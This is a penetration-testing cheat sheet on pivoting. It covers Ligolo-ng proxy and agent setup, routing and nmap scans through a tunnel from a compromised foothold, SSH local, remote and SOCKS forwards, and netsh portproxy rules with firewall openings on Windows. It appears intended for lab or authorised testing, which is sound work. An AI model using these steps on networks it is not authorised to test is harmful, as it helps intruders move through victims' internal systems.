# Tunneling

## Choose the tunnel

- need subnet reachability from Kali: use Ligolo
- need one localhost-only TCP service: use Ligolo localhost access, or SSH local forward / Windows `portproxy`
- need app access through an existing shell only: use a targeted forward, not a full tunnel

## Verify every forward

1. check the listener or route exists
2. connect to the forwarded port from Kali with the intended client
3. only then continue enumeration through it

## Ligolo-ng workflow
1. Start proxy on Kali.
2. In the Ligolo console, create the tun interface.
3. Run the agent on the foothold.
4. In the Ligolo console, select the session and start the tunnel.
5. In the Ligolo console, check the foothold subnet.
6. Add the route from the Ligolo console.
7. Scan from Kali with `-sT` / `--unprivileged`.

# Kali

## Create and bring up the tun interface
Run this first if Ligolo cannot create the interface for you.
```bash
sudo ip tuntap add user "$(whoami)" mode tun ligolo
sudo ip link set ligolo up
```

## Start proxy
```bash
./proxy -selfcert
```

# Ligolo Console

## Create the tun interface
```bash
interface_create --name ligolo
```

## Show the TLS fingerprint
```bash
certificate_fingerprint
```

# Foothold

## Start the agent
```cmd
agent.exe -connect <KALI-IP>:11601 -accept-fingerprint <FINGERPRINT>
```

# Lab fallback only
```cmd
agent.exe -connect <KALI-IP>:11601 -ignore-cert
```

# Ligolo Console

## Select the session
```bash
session
session <id>
```

## Start the tunnel
```bash
tunnel_start --tun ligolo
ifconfig
```

## Add the route
```bash
interface_add_route --name ligolo --route <subnet from ifconfig>
```

## Access the current agent localhost with Ligolo
Ligolo maps `240.0.0.0/4` to the current agent `127.0.0.1`.
```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

# Kali

## Scan through the tunnel
```bash
nmap -sn <subnet from ifconfig>
nmap -Pn -n --unprivileged -sT <target-ip>
```

## Local port forward with SSH
```bash
ssh -L 8080:172.16.5.10:80 user@<foothold>
```

## Expose a localhost-only Windows service with portproxy
```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=127.0.0.1 connectport=8080
netsh advfirewall firewall add rule name="portproxy_8080" dir=in action=allow protocol=TCP localport=8080
```

## Show and delete portproxy rules
```cmd
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
netsh advfirewall firewall delete rule name="portproxy_8080"
```

## Dynamic SOCKS proxy with SSH
```bash
ssh -D 9050 user@<foothold>
```

## Remote port forward with SSH
```bash
ssh -R 8080:127.0.0.1:80 user@<foothold>
```
